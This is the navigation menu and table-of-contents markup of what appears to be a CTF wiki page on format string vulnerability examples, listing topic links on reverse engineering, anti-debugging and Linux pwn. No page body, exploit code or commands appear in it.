        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1" >
        
          
          <label class="md-nav__link" for="__nav_7_1" id="__nav_7_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Reverse Overview
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_1">
            <span class="md-nav__icon md-icon"></span>
            Reverse Overview
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Software Reverse Engineering Introduction
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/Identify-Encode-Encryption/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Common Encryption Algorithms and Code Recognition
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/maze/maze/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Labyrinth Problem
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/vm/vm/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Virtual Machine Command Analysis
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/unicorn/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Unicorn Engine Introduction
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2" >
        
          
          <label class="md-nav__link" for="__nav_7_2" id="__nav_7_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Linux Reverse
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_2">
            <span class="md-nav__icon md-icon"></span>
            Linux Reverse
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1" >
        
          
          <label class="md-nav__link" for="__nav_7_2_1" id="__nav_7_2_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Linux Reverse Technology
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_2_1">
            <span class="md-nav__icon md-icon"></span>
            Linux Reverse Technology
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/linux/ld_preload/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    LD_PRELOAD
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/linux/false-disasm/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Incorrect Disassembly Fix
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/linux/detect-bp/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Detecting Breakpoints Bypassing
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/linux/detect-dbg/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Detecting Debugging Bypassing
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_3" >
        
          
          <label class="md-nav__link" for="__nav_7_3" id="__nav_7_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Windows Reverse
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_3">
            <span class="md-nav__icon md-icon"></span>
            Windows Reverse
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_3_1" >
        
          
          <label class="md-nav__link" for="__nav_7_3_1" id="__nav_7_3_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Shelling Technique
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_3_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_3_1">
            <span class="md-nav__icon md-icon"></span>
            Shelling Technique
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/unpack/packer-introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to the Protective case
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/unpack/trace/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Single Step Tracking Method
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/unpack/esp/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ESP Law
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/unpack/direct-oep/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    One Step to the OEP Method
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/unpack/memory/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Memory Mirroring Method
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/unpack/last-exception/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Last Exception Method
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/unpack/sfx/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    SFX Method
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/unpack/fix-iat/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    DUMP and IAT Reconstruction
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/unpack/manually-fix-iat/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Manually Find the IAT and Rebuild It Using ImportREC
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/unpack/unpack-dll/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    DLL File Unpacking
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_3_2" >
        
          
          <label class="md-nav__link" for="__nav_7_3_2" id="__nav_7_3_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Anti-debugging Technique
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_3_2">
            <span class="md-nav__icon md-icon"></span>
            Anti-debugging Technique
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/anti-debug/ntglobalflag/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NtGlobalFlag
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/anti-debug/heap-flags/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Heap Flags
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/anti-debug/the-heap/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    The Heap
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/anti-debug/int-3/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Interrupt 3
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/anti-debug/isdebuggerpresent/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    IsDebuggerPresent
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/anti-debug/checkremotedebuggerpresent/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CheckRemoteDebuggerPresent
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/anti-debug/ntqueryinformationprocess/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NtQueryInformationProcess
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/anti-debug/zwsetinformationthread/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ZwSetInformationThread
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/anti-debug/junk-code/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Flower command
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../reverse/windows/anti-debug/example/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Anti-debug Technical Example
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
      
        
        
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" checked>
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    Pwn
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            Pwn
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1" >
        
          
          <label class="md-nav__link" for="__nav_8_1" id="__nav_8_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Pwn Overview
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_1">
            <span class="md-nav__icon md-icon"></span>
            Pwn Overview
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../readme/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Readme
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_2" checked>
        
          
          <label class="md-nav__link" for="__nav_8_2" id="__nav_8_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Linux Pwn
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_8_2">
            <span class="md-nav__icon md-icon"></span>
            Linux Pwn
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_2_1" >
        
          
          <label class="md-nav__link" for="__nav_8_2_1" id="__nav_8_2_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Security Protection Mechanism
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_2_1">
            <span class="md-nav__icon md-icon"></span>
            Security Protection Mechanism
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../mitigation/canary/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Canary
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_2_2" >
        
          
          <label class="md-nav__link" for="__nav_8_2_2" id="__nav_8_2_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Stack Overflow
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_2_2">
            <span class="md-nav__icon md-icon"></span>
            Stack Overflow
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../stackoverflow/stack-intro/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Stack Introduction
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../stackoverflow/stackoverflow-basic/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Stack Overflow Principle
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../stackoverflow/basic-rop/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Basic ROP
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../stackoverflow/medium-rop/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Intermediate ROP
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../stackoverflow/advanced-rop.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Advanced ROP
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../stackoverflow/fancy-rop/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ROP Tricks
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_2_3" checked>
        
          
          <label class="md-nav__link" for="__nav_8_2_3" id="__nav_8_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Format String Vulnerability
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_2_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_8_2_3">
            <span class="md-nav__icon md-icon"></span>
            Format String Vulnerability
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../fmtstr_intro/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Format String Vulnerability Principle
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../fmtstr_exploit.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Format String Exploit
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Format String Vulnerability Example
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Format String Vulnerability Example
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#64-bit-program-format-string-vulnerability" class="md-nav__link">
    <span class="md-ellipsis">
      64-bit program format string vulnerability
    </span>
  </a>
  
    <nav class="md-nav" aria-label="64-bit program format string vulnerability">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principle" class="md-nav__link">
    <span class="md-ellipsis">
      Principle
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#examples" class="md-nav__link">
    <span class="md-ellipsis">
      Examples
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Examples">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determining-protection" class="md-nav__link">
    <span class="md-ellipsis">
      Determining protection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    <span class="md-ellipsis">
      分析程序
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#determining-the-offset" class="md-nav__link">
    <span class="md-ellipsis">
      Determining the offset
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-the-program" class="md-nav__link">
    <span class="md-ellipsis">
      Using the program
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hijack-got" class="md-nav__link">
    <span class="md-ellipsis">
      hijack GOT
    </span>
  </a>
  
    <nav class="md-nav" aria-label="hijack GOT">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principle_1" class="md-nav__link">
    <span class="md-ellipsis">
      Principle
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#examples_1" class="md-nav__link">
    <span class="md-ellipsis">
      Examples
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Examples">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determining-protection_1" class="md-nav__link">
    <span class="md-ellipsis">
      Determining protection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    <span class="md-ellipsis">
      分析程序
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploiting-ideas" class="md-nav__link">
    <span class="md-ellipsis">
      Exploiting ideas
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerability-program" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerability Program
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hijack-retaddr" class="md-nav__link">
    <span class="md-ellipsis">
      hijack retaddr
    </span>
  </a>
  
    <nav class="md-nav" aria-label="hijack retaddr">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principle_2" class="md-nav__link">
    <span class="md-ellipsis">
      Principle
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#examples_2" class="md-nav__link">
    <span class="md-ellipsis">
      Examples
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Examples">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determining-protection_2" class="md-nav__link">
    <span class="md-ellipsis">
      Determining protection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    <span class="md-ellipsis">
      分析程序
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-ideas" class="md-nav__link">
    <span class="md-ellipsis">
      Using ideas
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#determining-the-offset_1" class="md-nav__link">
    <span class="md-ellipsis">
      Determining the offset
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#change-address" class="md-nav__link">
    <span class="md-ellipsis">
      Change address
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-the-program_1" class="md-nav__link">
    <span class="md-ellipsis">
      Using the program
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#formatted-string-vulnerability-on-heap" class="md-nav__link">
    <span class="md-ellipsis">
      Formatted string vulnerability on heap
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Formatted string vulnerability on heap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principle_3" class="md-nav__link">
    <span class="md-ellipsis">
      Principle
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#examples_3" class="md-nav__link">
    <span class="md-ellipsis">
      Examples
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Examples">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determining-protection_3" class="md-nav__link">
    <span class="md-ellipsis">
      Determining protection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    <span class="md-ellipsis">
      分析程序
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-ideas_1" class="md-nav__link">
    <span class="md-ellipsis">
      Using ideas
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-the-relevant-address-and-offset" class="md-nav__link">
    <span class="md-ellipsis">
      Get the relevant address and offset
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#constructing-a-contact-to-get-the-heap-address" class="md-nav__link">
    <span class="md-ellipsis">
      Constructing a contact to get the heap address
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#modify-ebp" class="md-nav__link">
    <span class="md-ellipsis">
      Modify ebp
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-the-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Get the shell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-the-program_2" class="md-nav__link">
    <span class="md-ellipsis">
      Using the program
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#format-string-blind-hit" class="md-nav__link">
    <span class="md-ellipsis">
      Format string blind hit
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Format string blind hit">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principle_4" class="md-nav__link">
    <span class="md-ellipsis">
      Principle
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-1-leaking-stack" class="md-nav__link">
    <span class="md-ellipsis">
      Example 1 - Leaking Stack
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Example 1 - Leaking Stack">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determine-the-number-of-programs" class="md-nav__link">
    <span class="md-ellipsis">
      Determine the number of programs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#use" class="md-nav__link">
    <span class="md-ellipsis">
      Use
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-2-blind-hijacking-got" class="md-nav__link">
    <span class="md-ellipsis">
      Example 2 - Blind hijacking got
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Example 2 - Blind hijacking got">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determine-the-number-of-programs_1" class="md-nav__link">
    <span class="md-ellipsis">
      Determine the number of programs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#determining-the-offset_2" class="md-nav__link">
    <span class="md-ellipsis">
      Determining the offset
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#leaking-binary" class="md-nav__link">
    <span class="md-ellipsis">
      leaking binary
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ary" class="md-nav__link">
    <span class="md-ellipsis">
      分析斌ary
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#title" class="md-nav__link">
    <span class="md-ellipsis">
      Title
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../fmtstr_detect/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Format String Vulnerability Detection
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_2_4" >
        
          
          <label class="md-nav__link" for="__nav_8_2_4" id="__nav_8_2_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Glibc Heap Related
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_2_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_2_4">
            <span class="md-nav__icon md-icon"></span>
            Glibc Heap Related
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to Heap
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/heap_overview/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Heap Overview
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/heap_structure/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Heap Related Data Structure
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_2_4_4" >
        
          
          <label class="md-nav__link" for="__nav_8_2_4_4" id="__nav_8_2_4_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    In-depth Explanation of Ptmalloc2
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_8_2_4_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_2_4_4">
            <span class="md-nav__icon md-icon"></span>
            In-depth Explanation of Ptmalloc2
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/implementation/overview/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Implementation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/implementation/basic/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Basic Functions in the heap implementation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/implementation/heap-init/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Heap Initialization
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/implementation/malloc/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Allocate Heap Memory
    
  </span>
  

      </a>
    </li>
  

